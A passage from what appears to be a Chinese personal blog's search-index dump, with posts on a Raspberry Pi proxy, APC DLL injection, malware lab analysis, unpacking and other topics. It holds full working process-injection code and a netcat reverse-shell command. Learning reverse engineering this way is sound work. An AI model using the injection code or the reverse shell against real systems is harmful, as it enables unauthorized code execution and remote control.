&quot;password&quot;:&quot;ss密码&quot;, &quot;timeout&quot;:600, &quot;method&quot;:&quot;aes-256-cfb&quot; &#125; 6.redsocks安装 git clone git@github.com:darkk/redsocks.git（克隆失败可以在其他地方下载后传过来） sudo apt-get install libevent-dev cd redsocks make 在redsocks 文件夹中有redsocks.conf.example把它复制出来，重命名为 redsocks.conf我习惯放在&#x2F;etc目录下即&#x2F;etc&#x2F;redsocks.conf然后编辑配置文件 local_ip =0.0.0.0 ; local_port = 12345; 自己定义后面iptables要用 ip = 127.0.0.1; port = 1080; 7.kcptun 加速器的安装 Kcptun的作用主要是配合SS用来做加速。 下载地址 https://github.com/xtaci/kcptun/releases/latest 选择kcptun-linux-arm 那一个下载解压 tar -zxf kcptun-linux-arm*.tar.gz选择适合你的树莓派的二进制文件我选择的是client_linux_arm7 。 创建配置文件如下： &#123; &quot;localaddr&quot;: &quot;:8888&quot;, &quot;remoteaddr&quot;: &quot;服务器ip:端口&quot;, &quot;key&quot;: &quot;very fast&quot;, &quot;crypt&quot;: &quot;aes-128&quot;, &quot;mode&quot;: &quot;fast2&quot;, &quot;mtu&quot;: 1400, &quot;sndwnd&quot;: 256, &quot;rcvwnd&quot;: 2048, &quot;datashard&quot;: 10, &quot;parityshard&quot;: 3, &quot;dscp&quot;: 46, &quot;nocomp&quot;: false &#125; 然后把client_linux_arm7放到&#x2F;usr&#x2F;local&#x2F;bin 里面运行 sudo client_linux_arm7 -c 配置文件就可以了。 8.iptabels sudo sslocal -c /etc/shadowsocks/shadowsocks.json &amp; &gt; /dev/null 2&gt;&amp;1 sudo redsocks -c /etc/redsocks/redsocks.conf &amp; &gt; /dev/null 2&gt;&amp;1 sudo iptables -t nat -N REDSOCKS sudo iptables -t nat -A REDSOCKS -d 0.0.0.0 -j RETURN sudo iptables -t nat -A REDSOCKS -d 127.0.0.0/8 -j RETURN sudo iptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURN sudo iptables -t nat -A REDSOCKS -d 10.0.0.0/16 -j RETURN sudo iptables -t nat -A REDSOCKS -d 服务器IP -j RETURN sudo iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345 sudo iptables -t nat -A OUTPUT -p tcp -j REDSOCKS sudo iptables -t nat -A PREROUTING -i eth0 -p tcp -j REDSOCKS 9.此时你把局域网其他电脑设置成它还是不能上网，因为存在dns 问题通过安装dnsmasq来解决 sudo apt-get install dnsmasq 配置文件在 &#x2F;etc&#x2F;dnsmasq.conf编辑配置文件取消no-resolv前面的注释加入 server=202.38.93.153 server=202.141.162.123 保存重启dnsmasq sudo service dnsmasq restart 此时不出意外的话应该是可以把局域网内的其他主机网关s设置成 树莓派的ip ,然后实现透明上网。建议dns 设置成 server=202.38.93.153 server=202.141.162.123 10 .善后工作把上述的配置加入启动项 sudo /etc/init.d/ssh start sudo client_linux_arm7 -c /home/pi/Desktop/configus.txt &amp; &gt; /dev/null 2&gt;&amp;1 sudo sslocal -c /etc/shadowsocks-libev/ss.conf &amp; &gt; /dev/null 2&gt;&amp;1 sudo redsocks -c /etc/redsocks.conf &amp; &gt; /dev/null 2&gt;&amp;1 sudo service dnsmasq restart 附加：热点配置安装hostapd sudo apt-get install hostapd 配置文件&#x2F;etc&#x2F;hostapd&#x2F;hostapd.conf interface=wlan0 hw_mode=g channel=10 auth_algs=1 wpa=2 wpa_key_mgmt=WPA-PSK wpa_pairwise=CCMP rsn_pairwise=CCMP wpa_passphrase=wifi密码 ssid=wifi名字 dnsmasq 配置文件&#x2F;etc&#x2F;dnsmasq.conf 中修改 interface=wlan0 dhcp-range=10.0.0.2,10.0.0.255,255.255.255.0,12h 在启动项中&#x2F;etc&#x2F;rc.local 增加： sudo ifconfig wlan0 down sudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up sudo rm -rf /dev/random sudo ln -s /dev/urandom /dev/random sudo service dnsmasq restart sudo hostapd -B /etc/hostapd/hostapd.conf &amp; &gt; /dev/null 2&gt;&amp;1 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT 以及在&#x2F;etc&#x2F;iptables 中增加 sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp -j REDSOCKS 参考网址：http://fishedee.com/%E5%90%8E%E7%AB%AF/2016/11/30/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9A%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86.html http://www.jianshu.com/p/05d32b4e8fc0 http://blog.uiideas.com/2016/09/16/Kcptun%E4%BD%BF%E7%94%A8/ https://story.tonylee.name/2016/03/31/yong-shu-mei-pai-da-zao-wu-xian-zhong-ji-ke-xue-shang-wang-lu-you-qi/","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"dll注入之APC注入","slug":"dll之APC注入","date":"2017-09-15T16:00:00.000Z","updated":"2017-10-25T07:05:57.305Z","comments":true,"path":"2017/09/16/dll之APC注入/","link":"","permalink":"http://zwjsfdbb.top/2017/09/16/dll%E4%B9%8BAPC%E6%B3%A8%E5%85%A5/","excerpt":"APC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下： 1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。 2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。 3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。程序如下: // TESTAPC2.cpp : 定义控制台应用程序的入口点。 // #include &quot;stdafx.h&quot; #include &lt;string&gt; #include&lt;windows.h&gt; #include&lt;shlwapi.h&gt; #include&lt;tlhelp32.h&gt; #include&lt;winternl.h&gt; #pragma comment(lib,&quot;shlwapi.lib&quot;) #pragma comment(lib,&quot;ntdll.lib&quot;) using namespace std; //根据进程名获取PID DWORD GetPidFormName(wstring wsProcessname) &#123; HANDLE hSnaoshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnaoshot == INVALID_HANDLE_VALUE) &#123; return false; &#125; PROCESSENTRY32W pe = &#123; sizeof(pe) &#125;; BOOL bok; for (bok = Process32FirstW(hSnaoshot, &amp;pe); bok; bok = Process32NextW(hSnaoshot,&amp;pe)) &#123; wstring wsNowProcName = pe.szExeFile; if (StrStrI(wsNowProcName.c_str(), wsProcessname.c_str()) != NULL) &#123; CloseHandle(hSnaoshot); return pe.th32ProcessID; &#125; &#125; CloseHandle(hSnaoshot); return 0; &#125; //dll 文件注入到进程wsProcessname BOOL Injection_APC(const wstring &amp;wsProcessname, const WCHAR wcCacheInDllPath[]) &#123; DWORD dwProcessId = GetPidFormName(wsProcessname); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hProcess) &#123; return FALSE; &#125; PVOID lpData = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE); DWORD dwRet; if (lpData) &#123; //在远程进程申请空间写入待注入dll 的路径 WriteProcessMemory(hProcess, lpData, (LPVOID)wcCacheInDllPath,MAX_PATH, &amp;dwRet); CloseHandle(hProcess); &#125; //开始注入 THREADENTRY32 te = &#123; sizeof(te) &#125;; HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);//遍历系统中所有线程 if (handleSnap == INVALID_HANDLE_VALUE) &#123; return false; &#125; bool bstat = false; if (Thread32First(handleSnap, &amp;te)) &#123; do &#123; if (te.th32OwnerProcessID == dwProcessId) &#123; HANDLE handleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID); if (handleThread) &#123; DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, handleThread, (ULONG_PTR)lpData); &#125; if (dwRet &gt; 0) &#123; bstat = TRUE; &#125; CloseHandle(handleThread); &#125; &#125; while (Thread32Next(handleSnap, &amp;te)); CloseHandle(handleSnap); return bstat; &#125; &#125; int main() &#123; Injection_APC(L&quot;testapc.exe&quot;, L&quot;testapcdll.dll&quot;); return 0; &#125; 测试exe程序： #include&lt;windows.h&gt; int main() &#123; MessageBox(NULL, L&quot;start&quot;, L&quot;tit&quot;, MB_OK); SleepEx(1000 * 60 * 5, true); MessageBox(NULL, L&quot;end&quot;, L&quot;tit&quot;, MB_OK); Sleep(-1); &#125; 测试dll 程序： #include&lt;windows.h&gt; #include&quot;dll.h&quot; BOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved) &#123; switch (dwReason) &#123; // 动态链接库映射到某个进程的地址空间 case DLL_PROCESS_ATTACH: MessageBox(NULL, L&quot;in apc ok~&quot;, L&quot;tit&quot;, MB_OK); /** * 当DLL刚被加载时触发（LoadLibrary），此处专门用来做初始化工作， * 如果初始化失败可以返回 false 这样DLL就不会被继续加载了 **/ break; // 应用程序创建新的线程 case DLL_THREAD_ATTACH: break; // 应用程序某个线程正常终止 case DLL_THREAD_DETACH: break; // 动态链接库将被卸载 case DLL_PROCESS_DETACH: /** * 当DLL将要被卸载时触发（FreeLibrary）,此处专门用来做清理工作 * 如关闭文件，释放内存空间等 **/ break; &#125; return 1; &#125; /* void helloDLL(void) &#123; //MessageBox(NULL, TEXT(&quot;Hello DLL~&quot;), TEXT(&quot;Title&quot;), MB_OK); &#125;*/","text":"APC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下： 1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。 2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。 3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。程序如下: // TESTAPC2.cpp : 定义控制台应用程序的入口点。 // #include &quot;stdafx.h&quot; #include &lt;string&gt; #include&lt;windows.h&gt; #include&lt;shlwapi.h&gt; #include&lt;tlhelp32.h&gt; #include&lt;winternl.h&gt; #pragma comment(lib,&quot;shlwapi.lib&quot;) #pragma comment(lib,&quot;ntdll.lib&quot;) using namespace std; //根据进程名获取PID DWORD GetPidFormName(wstring wsProcessname) &#123; HANDLE hSnaoshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnaoshot == INVALID_HANDLE_VALUE) &#123; return false; &#125; PROCESSENTRY32W pe = &#123; sizeof(pe) &#125;; BOOL bok; for (bok = Process32FirstW(hSnaoshot, &amp;pe); bok; bok = Process32NextW(hSnaoshot,&amp;pe)) &#123; wstring wsNowProcName = pe.szExeFile; if (StrStrI(wsNowProcName.c_str(), wsProcessname.c_str()) != NULL) &#123; CloseHandle(hSnaoshot); return pe.th32ProcessID; &#125; &#125; CloseHandle(hSnaoshot); return 0; &#125; //dll 文件注入到进程wsProcessname BOOL Injection_APC(const wstring &amp;wsProcessname, const WCHAR wcCacheInDllPath[]) &#123; DWORD dwProcessId = GetPidFormName(wsProcessname); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hProcess) &#123; return FALSE; &#125; PVOID lpData = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE); DWORD dwRet; if (lpData) &#123; //在远程进程申请空间写入待注入dll 的路径 WriteProcessMemory(hProcess, lpData, (LPVOID)wcCacheInDllPath,MAX_PATH, &amp;dwRet); CloseHandle(hProcess); &#125; //开始注入 THREADENTRY32 te = &#123; sizeof(te) &#125;; HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);//遍历系统中所有线程 if (handleSnap == INVALID_HANDLE_VALUE) &#123; return false; &#125; bool bstat = false; if (Thread32First(handleSnap, &amp;te)) &#123; do &#123; if (te.th32OwnerProcessID == dwProcessId) &#123; HANDLE handleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID); if (handleThread) &#123; DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, handleThread, (ULONG_PTR)lpData); &#125; if (dwRet &gt; 0) &#123; bstat = TRUE; &#125; CloseHandle(handleThread); &#125; &#125; while (Thread32Next(handleSnap, &amp;te)); CloseHandle(handleSnap); return bstat; &#125; &#125; int main() &#123; Injection_APC(L&quot;testapc.exe&quot;, L&quot;testapcdll.dll&quot;); return 0; &#125; 测试exe程序： #include&lt;windows.h&gt; int main() &#123; MessageBox(NULL, L&quot;start&quot;, L&quot;tit&quot;, MB_OK); SleepEx(1000 * 60 * 5, true); MessageBox(NULL, L&quot;end&quot;, L&quot;tit&quot;, MB_OK); Sleep(-1); &#125; 测试dll 程序： #include&lt;windows.h&gt; #include&quot;dll.h&quot; BOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved) &#123; switch (dwReason) &#123; // 动态链接库映射到某个进程的地址空间 case DLL_PROCESS_ATTACH: MessageBox(NULL, L&quot;in apc ok~&quot;, L&quot;tit&quot;, MB_OK); /** * 当DLL刚被加载时触发（LoadLibrary），此处专门用来做初始化工作， * 如果初始化失败可以返回 false 这样DLL就不会被继续加载了 **/ break; // 应用程序创建新的线程 case DLL_THREAD_ATTACH: break; // 应用程序某个线程正常终止 case DLL_THREAD_DETACH: break; // 动态链接库将被卸载 case DLL_PROCESS_DETACH: /** * 当DLL将要被卸载时触发（FreeLibrary）,此处专门用来做清理工作 * 如关闭文件，释放内存空间等 **/ break; &#125; return 1; &#125; /* void helloDLL(void) &#123; //MessageBox(NULL, TEXT(&quot;Hello DLL~&quot;), TEXT(&quot;Title&quot;), MB_OK); &#125;*/","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"VS错误集","slug":"vs错误集","date":"2017-09-13T16:00:00.000Z","updated":"2017-10-25T04:01:47.287Z","comments":true,"path":"2017/09/14/vs错误集/","link":"","permalink":"http://zwjsfdbb.top/2017/09/14/vs%E9%94%99%E8%AF%AF%E9%9B%86/","excerpt":"一 .无法解析的外部符号 _main，该符号在函数 “int __cdecl invoke_main(void)” (?invoke_main@@YAHXZ) 中被引用window F:\\c\\window\\window\\MSVCRTD.lib(exe_main.obj) &amp;emsp;&amp;emsp;原因是c语言程序找不到适当的入口程序函数 般情况下， &amp;emsp;&amp;emsp;如果是windows程序，那么WinMain是入口函数，在VS2017中新建项目为“win32项目” &amp;emsp;&amp;emsp;如果是dos控制台程序，那么main是入口函数，在VS2017中新建项目为“win32控制台应用程序”而如果入口函数指定不当，很显然c语言运行时找不到配合函数，它就会报告错误。修改设置适应你的需求 &amp;emsp;&amp;emsp;如果是windows程序： 1.菜单中选择 工程-&gt;属性, 弹出属性窗口 2.在左边栏中依次选择：配置属性-&gt;C&#x2F;C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_CONSOLE, 添加_WINDOWS. 3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为Windows(&#x2F;SUBSYSTEM:WINDOWS)如果是控制台程序： 1.菜单中选择 工程-&gt;属性, 弹出弹出属性窗口 2.在左边栏中依次选择：配置属性-&gt;C&#x2F;C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_WINDOWS, 添加_CONSOLE. 3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为CONSOLE(&#x2F;SUBSYSTEM:CONSOLE) 二 vs2015丢失msvcp140.dll 无法运行程序 1.可以选择静态编译 初始状态是这样的","text":"一 .无法解析的外部符号 _main，该符号在函数 “int __cdecl invoke_main(void)” (?invoke_main@@YAHXZ) 中被引用window F:\\c\\window\\window\\MSVCRTD.lib(exe_main.obj) &amp;emsp;&amp;emsp;原因是c语言程序找不到适当的入口程序函数 般情况下， &amp;emsp;&amp;emsp;如果是windows程序，那么WinMain是入口函数，在VS2017中新建项目为“win32项目” &amp;emsp;&amp;emsp;如果是dos控制台程序，那么main是入口函数，在VS2017中新建项目为“win32控制台应用程序”而如果入口函数指定不当，很显然c语言运行时找不到配合函数，它就会报告错误。修改设置适应你的需求 &amp;emsp;&amp;emsp;如果是windows程序： 1.菜单中选择 工程-&gt;属性, 弹出属性窗口 2.在左边栏中依次选择：配置属性-&gt;C&#x2F;C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_CONSOLE, 添加_WINDOWS. 3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为Windows(&#x2F;SUBSYSTEM:WINDOWS)如果是控制台程序： 1.菜单中选择 工程-&gt;属性, 弹出弹出属性窗口 2.在左边栏中依次选择：配置属性-&gt;C&#x2F;C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_WINDOWS, 添加_CONSOLE. 3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为CONSOLE(&#x2F;SUBSYSTEM:CONSOLE) 二 vs2015丢失msvcp140.dll 无法运行程序 1.可以选择静态编译 初始状态是这样的 2.安装vs2015运行库。","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"sublime中文乱码处理","slug":"sublime乱码处理","date":"2017-09-12T16:00:00.000Z","updated":"2017-10-25T07:30:17.323Z","comments":true,"path":"2017/09/13/sublime乱码处理/","link":"","permalink":"http://zwjsfdbb.top/2017/09/13/sublime%E4%B9%B1%E7%A0%81%E5%A4%84%E7%90%86/","excerpt":"一、安装包管理器使用Ctrl+~快捷键或者通过View-&gt;Show Console菜单打开命令行，粘贴如下代码 import urllib.request,os; pf = &#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &#39;wb&#39;).write(urllib.request.urlopen( &#39;http://sublime.wbond.net/&#39; + pf.replace(&#39; &#39;,&#39; &#39;)).read()) 顺利的话，此时就可以在Preferences菜单下看到Package Settings和Package Control两个菜单了 二、安装乱码处理插件： 调用ctrl+shift+p,输入：install package，回车，在稍后弹出的安装包框中搜索：ConvertToUTF8或者GBK Encoding Support，选择点击安装；","text":"一、安装包管理器使用Ctrl+~快捷键或者通过View-&gt;Show Console菜单打开命令行，粘贴如下代码 import urllib.request,os; pf = &#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &#39;wb&#39;).write(urllib.request.urlopen( &#39;http://sublime.wbond.net/&#39; + pf.replace(&#39; &#39;,&#39; &#39;)).read()) 顺利的话，此时就可以在Preferences菜单下看到Package Settings和Package Control两个菜单了 二、安装乱码处理插件： 调用ctrl+shift+p,输入：install package，回车，在稍后弹出的安装包框中搜索：ConvertToUTF8或者GBK Encoding Support，选择点击安装；","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"shellcode 实现键盘记录样本分析","slug":"shellcode 实现键盘记录样本分析","date":"2017-09-10T16:00:00.000Z","updated":"2017-10-25T07:02:55.302Z","comments":true,"path":"2017/09/11/shellcode 实现键盘记录样本分析/","link":"","permalink":"http://zwjsfdbb.top/2017/09/11/shellcode%20%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/","excerpt":"1.样本来源于《恶意代码分析实战》的实验样本Lab11-03.exe和Lab11-03.dll.2.首先对Lab11-03.exe进行基础分析，查看字符串和导入导出函数。用strings可以看到 C:\\WINDOWS\\System32\\inet_epar32.dll zzz69806582 net start cisvc C:\\WINDOWS\\System32\\%s cisvc.exe Lab11-03.dll 等字符串，C:\\WINDOWS\\System32\\inet_epar32.dll表示程序可能加载该dll,net start cisvc是服务的启动方式，cisvc.exe代表该程序可能被启动。然后对Lab11-03.dll进行分析，出现了 C:\\WINDOWS\\System32\\kernel64x.dll zzz69806582 GetForegroundWindow GetAsyncKeyState 等，C:\\WINDOWS\\System32\\kernel64x.dll表示程序可能加载该dll，zzz69806582暂时还看不出来有什作用，GetForegroundWindow，GetAsyncKeyState表示这很可能是一个键盘记录器。3.然后进行动态分析，命令行切到当前目录下，运行Lab11-03.exe，用procmon和procexp进行监控， 如图可以看到该样本启动了一个服务。至于启动什么服务，通过procmon来具体看。在进程栏看到了net start cisvc 在文件操作一栏我们可以看到创建并写入了文件inet_epar32.dll,打开了cisvc.exe但是并没有写入文件的操作。","text":"1.样本来源于《恶意代码分析实战》的实验样本Lab11-03.exe和Lab11-03.dll.2.首先对Lab11-03.exe进行基础分析，查看字符串和导入导出函数。用strings可以看到 C:\\WINDOWS\\System32\\inet_epar32.dll zzz69806582 net start cisvc C:\\WINDOWS\\System32\\%s cisvc.exe Lab11-03.dll 等字符串，C:\\WINDOWS\\System32\\inet_epar32.dll表示程序可能加载该dll,net start cisvc是服务的启动方式，cisvc.exe代表该程序可能被启动。然后对Lab11-03.dll进行分析，出现了 C:\\WINDOWS\\System32\\kernel64x.dll zzz69806582 GetForegroundWindow GetAsyncKeyState 等，C:\\WINDOWS\\System32\\kernel64x.dll表示程序可能加载该dll，zzz69806582暂时还看不出来有什作用，GetForegroundWindow，GetAsyncKeyState表示这很可能是一个键盘记录器。3.然后进行动态分析，命令行切到当前目录下，运行Lab11-03.exe，用procmon和procexp进行监控， 如图可以看到该样本启动了一个服务。至于启动什么服务，通过procmon来具体看。在进程栏看到了net start cisvc 在文件操作一栏我们可以看到创建并写入了文件inet_epar32.dll,打开了cisvc.exe但是并没有写入文件的操作。 在注册表一栏并没有看到什么信息。此时我们更换过滤条件，查看一下cisvc.exe进行了哪些操作。可以看到加载inet_epar32.dll，在系统文件夹中创建了kernel64x.dll文件，并写入了一些内容猜测是键盘记录的内容。 4.下面进行静态高级分析。把Lab11-03.exe和Lab11-03.dll分别载入ida进行分析。代码反编译为c可以看到很简单。 首先是把Lab11-03.dll复制为C:\\WINDOWS\\System32\\inet_epar32.dll，然后sub_401070函数时对cisvc.exe的操作，看到是对cisvc.exe进行文件映射然后byte_409030位置的314个字节的内容写到cisvc.exe的开始位置，很显示cisvc.exe插入了一段shellcode,下面查看这段shellcode,在409030位置可以看到是原始字节内容，按c可以反汇编为汇编代码，如图 如图是shellcode 代码，在sehcode 末尾是一些字符串，按a可以显示完整字符串，猜测此shellc是加载该dll,后面的字符串仍然不知道是什么。 此时我们用ida加载inet_epart32.dll也即是Lab11-03.dll，在导出函数中我们可以看到是以上的未知字符串刚好是其的导出函数，分析该函数看到仅仅只是创建了一个线程，分析该线程，可以看到此线程是实现键盘记录的，其记录保存在C:\\WINDOWS\\System32\\kernel64x.dll中。 下面对cisvc.exe进行分析。分析插入shellcode前后的变化。首先用PE view查看pe头的变化。可以看到入口位置发生了变化。 分别用ida载入，可以看到插入shellcode的cisvc.exe入口点直接就是shellcode代码，在od中载入，然后单步运行观察shellcode的功能。 如图1001b0a位置是加载C:\\WINDOWS\\System32\\inet_epar32.dll的位置，下面是获取zzz69806582函数地址。到此整个流程就分析完了。 Lab11-03.exe把Lab11-03.dll复制为C:\\WINDOWS\\System32\\inet_epar32.dll，启动cisvc服务，然后再cisvc.exe中插入一段shellcode，来实现键盘记录，记录保存在C:\\WINDOWS\\System32\\kernel64x.dll。打开notepad随便输入进行测试，然后用flexhex打开C:\\WINDOWS\\System32\\kernel64x.dll，可以看到记录了notepad和输入的内容。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"常规脱壳","slug":"常规脱壳","date":"2017-08-08T16:00:00.000Z","updated":"2023-07-22T06:32:58.737Z","comments":true,"path":"2017/08/09/常规脱壳/","link":"","permalink":"http://zwjsfdbb.top/2017/08/09/%E5%B8%B8%E8%A7%84%E8%84%B1%E5%A3%B3/","excerpt":"总结方法如下： 1、单步跟（向上的跳转下一步F4） 2、esp定律 3、二次内存镜像 4、一次到位 5、模拟跟踪 tc eip&lt;sfx 调试 sfx 第二个 6、最后一次异常 7、特殊方法 at GetVersion等","text":"总结方法如下： 1、单步跟（向上的跳转下一步F4） 2、esp定律 3、二次内存镜像 4、一次到位 5、模拟跟踪 tc eip&lt;sfx 调试 sfx 第二个 6、最后一次异常 7、特殊方法 at GetVersion等 8、注意事项当用OD插件脱壳后不能运行时，可以用loadpe修正镜像大小，然后再重建输入表，再看是否成功，不行的话，手动找一找IAT的起始位置和结束为止，看Import REC 的RVA和大小是否一致，如果还不行就用load pe重建PE 9、常用语言的入口特征： VB： 004012D4 &gt; 68 54474000 push QQ个性网.00404754 004012D9 E8 F0FFFFFF call &lt;jmp.&amp;MSVBVM60.#100&gt; 004012DE 0000 add byte ptr ds:[eax],al 004012E0 0000 add byte ptr ds:[eax],al 004012E2 0000 add byte ptr ds:[eax],al 004012E4 3000 xor byte ptr ds:[eax],al 004012E6 0000 add byte ptr ds:[eax],al 004012E8 48 dec eax delphi: 004A5C54 &gt; 55 push ebp 004A5C55 8BEC mov ebp,esp 004A5C57 83C4 F0 add esp,-10 004A5C5A B8 EC594A00 mov eax,openpro.004A59EC BC++: 00401678 &gt; /EB 10 jmp short btengine.0040168A 0040167A |66:623A bound di,dword ptr ds:[edx] 0040167D |43 inc ebx 0040167E |2B2B sub ebp,dword ptr ds:[ebx] 00401680 |48 dec eax 00401681 |4F dec edi 00401682 |4F dec edi 00401683 |4B dec ebx 00401684 |90 nop 00401685 -|E9 98005400 jmp 00941722 0040168A \\A1 8B005400 mov eax,dword ptr ds:[54008B] 0040168F C1E0 02 shl eax,2 00401692 A3 8F005400 mov dword ptr ds:[54008F],eax 00401697 52 push edx 00401698 6A 00 push 0 0040169A E8 99D01300 call &lt;jmp.&amp;KERNEL32.GetModuleHandleA&gt; 0040169F 8BD0 mov edx,eax VC++: 0040A41E &gt; 55 push ebp 0040A41F 8BEC mov ebp,esp 0040A421 6A FF push -1 0040A423 68 C8CB4000 push 跑跑排行.0040CBC8 0040A428 68 A4A54000 push &lt;jmp.&amp;MSVCRT._except_handler3&gt; 0040A42D 64:A1 00000000 mov eax,dword ptr fs:[0] 0040A433 50 push eax 0040A434 64:8925 0000000&gt;mov dword ptr fs:[0],esp 0040A43B 83EC 68 sub esp,68 0040A43E 53 push ebx 0040A43F 56 push esi 0040A440 57 push edi MASM(汇编): 004035C9 &gt; 6A 00 push 0 004035CB E8 A20A0000 call &lt;jmp.&amp;kernel32.GetModuleHandleA&gt; 004035D0 A3 5B704000 mov dword ptr ds:[40705B],eax 004035D5 68 80000000 push 80 004035DA 68 2C754000 push 11.0040752C 004035DF FF35 5B704000 push dword ptr ds:[40705B] 004035E5 E8 820A0000 call &lt;jmp.&amp;kernel32.GetModuleFileNameA&gt; 004035EA E8 87070000 call 11.00403D76 004035EF 6A 00 push 0 004035F1 68 0B364000 push 11.0040360B 004035F6 6A 00 push 0 004035F8 6A 64 push 64 004035FA FF35 5B704000 push dword ptr ds:[40705B]","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"netcat-反向shell","slug":"netcat—反向shell","date":"2017-08-05T16:00:00.000Z","updated":"2023-07-27T14:36:55.056Z","comments":true,"path":"2017/08/06/netcat—反向shell/","link":"","permalink":"http://zwjsfdbb.top/2017/08/06/netcat%E2%80%94%E5%8F%8D%E5%90%91shell/","excerpt":"利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell 1.windows端下载netcat程序，加入环境变量，cmd执行nc命令 nc.exe ip 端口 -e cmd.exe 2.linux 主机执行 nc -l -p 80 3.在windows主机上就建立了一个反向 的shell,在linux主机上就可以直接操作了。","text":"利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell 1.windows端下载netcat程序，加入环境变量，cmd执行nc命令 nc.exe ip 端口 -e cmd.exe 2.linux 主机执行 nc -l -p 80 3.在windows主机上就建立了一个反向 